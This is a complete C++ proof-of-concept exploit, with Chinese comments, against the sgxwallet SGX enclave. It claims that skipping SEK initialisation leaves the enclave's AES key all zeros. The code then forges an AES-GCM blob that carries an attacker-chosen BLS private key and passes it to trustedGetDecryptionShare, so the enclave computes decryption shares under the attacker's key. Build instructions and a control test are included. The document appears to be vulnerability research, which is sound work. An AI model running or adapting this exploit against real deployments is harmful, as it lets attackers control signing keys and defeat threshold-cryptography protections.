// PoC: sgxwallet trustedGetDecryptionShare — AES_key=0 MAC Forgery
//
// 漏洞位置: secure_enclave/AESUtils.c + secure_enclave/secure_enclave.c
//
// 根本原因:
//   AES_key[1024] 是全局变量，零初始化。只有调用以下之一才会设置它：
//     - trustedGenerateSEK  (随机生成 SEK)
//     - trustedSetSEK       (从 sealed data 中恢复 SEK)
//     - trustedSetSEKBackup (从备份恢复 SEK)
//   如果 host 仅调用 trustedEnclaveInit 而跳过 SEK 初始化，
//   则 AES_key[512..527] = 0x00 * 16 (全零 AES-128 密钥)。
//
// 攻击链:
//   1. Host 调用 trustedEnclaveInit  →  libff 曲线初始化完成
//   2. Host 不调用 trustedGenerateSEK / trustedSetSEK
//      →  AES_key[512] = 0x00 * 16  (默认零值)
//   3. 攻击者在 host 端用 AES-128-GCM(key=0) 加密任意 BLS 私钥
//      明文格式: [type=BLS='2'][exportable='1'][64-hex-key]['\0'] = 67 bytes
//      密文格式: [MAC 16B][IV 12B][CT 67B] = 95 bytes
//   4. 攻击者调用 trustedGetDecryptionShare(forged_blob, pub_val, 95, share)
//   5. 飞地用 key=0 解密 → MAC 验证通过 → shift loop → skey_hex = 攻击者选择的密钥
//   6. getDecryptionShare 用攻击者密钥计算 BLS 解密份额
//
// 影响:
//   - 攻击者完全控制飞地使用的 BLS 私钥
//   - 破坏门限密码学协议的安全性
//   - 无需知道真实 SEK，无需 SGX 攻击
//
// 前提: host 应用程序在初始化时（如首次启动、密钥迁移等场景）跳过 SEK 初始化
//
// 编译:
//   SGX_SDK=/home/leone/EnclaveFuzz/sgx_apps/sgxwallet/sgx-sdk-build/sgxsdk
//   g++ -std=c++17 -O0 -g \
//       -I${SGX_SDK}/include \
//       -I. \
//       poc_zero_sek.cpp secure_enclave_u.o \
//       -L${SGX_SDK}/lib64 -lsgx_urts_sim \
//       -Wl,-rpath,${SGX_SDK}/lib64 \
//       -lssl -lcrypto \
//       -o poc_zero_sek
//   SGX_MODE=SIM ./poc_zero_sek

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

// OpenSSL AES-GCM for forging the ciphertext on the host side
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>

// SGX host-side API
#include <sgx_urts.h>
#include "secure_enclave_u.h"

// ── 常量 ─────────────────────────────────────────────────────────────────────

// AES-GCM 参数 (与飞地内 SGX SDK 定义一致)
#define MAC_SIZE   16   // SGX_AESGCM_MAC_SIZE
#define IV_SIZE    12   // SGX_AESGCM_IV_SIZE

// 明文类型字节 (来自 AESUtils.h)
#define TYPE_BLS        '2'
#define EXPORTABLE_FLAG '1'

// skey_hex 缓冲区大小 (ECDSA_SKEY_LEN=65，含末尾\0)
#define SKEY_HEX_LEN 64

// 飞地文件 (simulation 模式使用 .signed.so)
#define ENCLAVE_FILE "secure_enclave/secure_enclave.signed.so"

// 攻击者选择的 BLS 私钥 (64位十六进制)
// 任意合法的 alt_bn128 Fr 标量即可；这里使用易识别的值以便验证
static const char ATTACKER_KEY_HEX[65] =
    "deadbeefcafebabe1234567890abcdef"
    "deadbeefcafebabe1234567890abcdef";

// alt_bn128 G2 生成元坐标 (X.c0:X.c1:Y.c0:Y.c1，十进制)
// 来源: libff/algebra/curves/alt_bn128/alt_bn128_init.cpp
// G2_one = alt_bn128_G2(Fq2(Fq(c0), Fq(c1)), Fq2(Fq(c0), Fq(c1)), ...)
static const char G2_GENERATOR[] =
    "10857046999023057135944570762232829481370756359578518086990519993285655852781"
    ":11559732032986387107991004021392285783925812861821192530917403151452391805634"
    ":8495653923123431417604973247489272438418190587263600148770280649306958101930"
    ":4082367875863433681332203403145435568316851327593401208105741076214120093531";

// ── AES-128-GCM 加密 (host 端，OpenSSL) ─────────────────────────────────────
//
// 输出格式: [MAC 16B][IV 12B][CT len(plaintext)B]
// 与飞地 AES_encrypt 的输出格式完全一致
//
// 返回 total = MAC_SIZE + IV_SIZE + plaintext_len，失败返回 -1
static int forge_aes_gcm(
    const uint8_t *key16,       // 16字节 AES 密钥 (全零)
    const uint8_t *plaintext,
    int            pt_len,
    uint8_t       *out,         // 输出缓冲区，至少 MAC_SIZE+IV_SIZE+pt_len
    int            out_capacity
) {
    int total = MAC_SIZE + IV_SIZE + pt_len;
    if (out_capacity < total) {
        fprintf(stderr, "[-] forge_aes_gcm: output buffer too small\n");
        return -1;
    }

    uint8_t *mac = out;                   // [0..15]
    uint8_t *iv  = out + MAC_SIZE;        // [16..27]
    uint8_t *ct  = out + MAC_SIZE + IV_SIZE; // [28..]

    // 随机 IV（与飞地的 sgx_read_rand 行为一致，但值无关紧要）
    if (RAND_bytes(iv, IV_SIZE) != 1) {
        fprintf(stderr, "[-] RAND_bytes failed\n");
        return -1;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;

    int ok = 1;
    int outl = 0;

    ok &= EVP_EncryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL);
    ok &= EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, NULL);
    ok &= EVP_EncryptInit_ex(ctx, NULL, NULL, key16, iv);
    ok &= EVP_EncryptUpdate(ctx, ct, &outl, plaintext, pt_len);
    ok &= EVP_EncryptFinal_ex(ctx, ct + outl, &outl);
    ok &= EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, MAC_SIZE, mac);

    EVP_CIPHER_CTX_free(ctx);

    if (!ok) {
        ERR_print_errors_fp(stderr);
        return -1;
    }
    return total;
}

// ── OCall 桩 (飞地日志) ──────────────────────────────────────────────────────
void ocall_SGXWalletServer_log(int level, const char *msg) {
    (void)level;
    // 取消注释以查看飞地内部日志:
    // fprintf(stderr, "[enclave] %s\n", msg);
    (void)msg;
}

// ── main ─────────────────────────────────────────────────────────────────────
int main(int argc, char **argv) {
    (void)argc; (void)argv;

    printf("=== PoC: sgxwallet trustedGetDecryptionShare AES_key=0 MAC Forgery ===\n\n");

    // ── 步骤 1: 加载飞地 ─────────────────────────────────────────────────────
    printf("[*] 步骤1: 加载飞地 %s\n", ENCLAVE_FILE);
    sgx_enclave_id_t eid = 0;
    sgx_launch_token_t token = {};
    int updated = 0;
    sgx_status_t st = sgx_create_enclave(
        ENCLAVE_FILE, SGX_DEBUG_FLAG, &token, &updated, &eid, NULL);
    if (st != SGX_SUCCESS) {
        fprintf(stderr, "[-] sgx_create_enclave failed: 0x%x\n", st);
        return 1;
    }
    printf("[+] 飞地加载成功, eid=%lu\n", (unsigned long)eid);

    // ── 步骤 2: 调用 trustedEnclaveInit，但不调用 trustedGenerateSEK ──────────
    printf("\n[*] 步骤2: 调用 trustedEnclaveInit (不初始化 SEK)\n");
    printf("    → AES_key[512..527] 保持全零\n");
    st = trustedEnclaveInit(eid, 0 /* log level */);
    if (st != SGX_SUCCESS) {
        fprintf(stderr, "[-] trustedEnclaveInit failed: 0x%x\n", st);
        sgx_destroy_enclave(eid);
        return 1;
    }
    printf("[+] trustedEnclaveInit 成功, libff 曲线已初始化\n");

    // ── 步骤 3: 构造明文，格式与 AES_encrypt 一致 ────────────────────────────
    //
    // fullMessage[0]   = type       = BLS = '2'
    // fullMessage[1]   = exportable = '1'
    // fullMessage[2..65] = 64-char hex private key
    // fullMessage[66]  = '\0'
    // total = 67 bytes
    //
    printf("\n[*] 步骤3: 构造恶意明文\n");
    uint8_t plaintext[67];
    plaintext[0] = TYPE_BLS;
    plaintext[1] = EXPORTABLE_FLAG;
    memcpy(plaintext + 2, ATTACKER_KEY_HEX, SKEY_HEX_LEN);
    plaintext[66] = '\0';

    printf("    type       = '\\x%02x' (BLS)\n", plaintext[0]);
    printf("    exportable = '\\x%02x'\n", plaintext[1]);
    printf("    key_hex    = %.64s\n", ATTACKER_KEY_HEX);
    printf("    plaintext len = %d bytes\n", (int)sizeof(plaintext));

    // ── 步骤 4: 用 AES-128-GCM(key=0) 加密 ──────────────────────────────────
    printf("\n[*] 步骤4: 用全零密钥 AES-128-GCM 加密 (模拟飞地内部行为)\n");

    uint8_t zero_key[16] = {0};  // AES_key[512] 的值 (全零)
    uint8_t forged_blob[MAC_SIZE + IV_SIZE + 67];
    int blob_len = forge_aes_gcm(
        zero_key, plaintext, sizeof(plaintext), forged_blob, sizeof(forged_blob));
    if (blob_len < 0) {
        fprintf(stderr, "[-] AES-GCM 加密失败\n");
        sgx_destroy_enclave(eid);
        return 1;
    }

    printf("[+] 伪造密文成功，总长度=%d\n", blob_len);
    printf("    MAC: ");
    for (int i = 0; i < MAC_SIZE; i++) printf("%02x", forged_blob[i]);
    printf("\n    IV:  ");
    for (int i = MAC_SIZE; i < MAC_SIZE+IV_SIZE; i++) printf("%02x", forged_blob[i]);
    printf("\n");

    // ── 步骤 5: 调用 trustedGetDecryptionShare ───────────────────────────────
    printf("\n[*] 步骤5: 调用 trustedGetDecryptionShare 传入伪造密文\n");
    printf("    encryptedPrivateKey = forged_blob (%d bytes)\n", blob_len);
    printf("    public_decryption_value = G2 生成元\n");

    int      errStatus = -1;
    char     errString[1024] = {0};
    char     decryptionShare[1024] = {0};

    st = trustedGetDecryptionShare(
        eid,
        &errStatus,
        errString,
        forged_blob,                // 伪造的加密私钥
        G2_GENERATOR,               // G2 生成元作为解密值输入
        (uint64_t)blob_len,         // key_len = 95
        decryptionShare             // 输出: 攻击者选择密钥的解密份额
    );

    printf("\n=== 结果 ===\n");
    printf("sgx_status  = 0x%x (%s)\n", st, st == SGX_SUCCESS ? "SGX_SUCCESS" : "FAILED");
    printf("errStatus   = %d (%s)\n", errStatus, errStatus == 0 ? "OK" : "ERROR");

    if (st == SGX_SUCCESS && errStatus == 0) {
        printf("\n[!!!] 漏洞验证成功!\n");
        printf("      飞地接受了伪造的密文并使用攻击者选择的 BLS 密钥\n");
        printf("      decryptionShare = %s\n", decryptionShare);
        printf("\n      预期行为: 使用攻击者密钥 0x%.16s... 计算了 BLS 解密份额\n",
               ATTACKER_KEY_HEX);
        printf("      攻击者可以此份额欺骗门限解密协议\n");
    } else {
        printf("\n[~] 漏洞未触发\n");
        printf("    errString: %s\n", errString);
        printf("\n    可能原因:\n");
        printf("    1. 飞地已提前调用了 trustedGenerateSEK (SEK 非零)\n");
        printf("    2. getDecryptionShare 因无效 G2 坐标返回错误\n");
        printf("    3. 编译时链接的 OpenSSL 版本与飞地内部不兼容\n");
    }

    // ── 对照实验: 使用随机密钥 (无法伪造 MAC，应失败) ──────────────────────
    printf("\n--- 对照实验: 使用随机密钥加密 (MAC 验证应失败) ---\n");
    {
        uint8_t random_key[16];
        RAND_bytes(random_key, 16);

        uint8_t bad_blob[MAC_SIZE + IV_SIZE + 67];
        int bad_len = forge_aes_gcm(
            random_key, plaintext, sizeof(plaintext), bad_blob, sizeof(bad_blob));

        int      ce_status = -1;
        char     ce_errStr[1024] = {0};
        char     ce_share[1024]  = {0};

        sgx_status_t ce_st = trustedGetDecryptionShare(
            eid, &ce_status, ce_errStr,
            bad_blob, G2_GENERATOR, (uint64_t)bad_len, ce_share);

        printf("使用随机密钥: sgx_status=0x%x errStatus=%d\n", ce_st, ce_status);
        if (ce_status != 0) {
            printf("[+] 对照实验符合预期: 随机密钥 MAC 验证失败, 飞地返回错误\n");
        } else {
            printf("[?] 对照实验异常: 随机密钥竟然通过了验证!\n");
        }
    }

    sgx_destroy_enclave(eid);
    return (st == SGX_SUCCESS && errStatus == 0) ? 0 : 1;
}
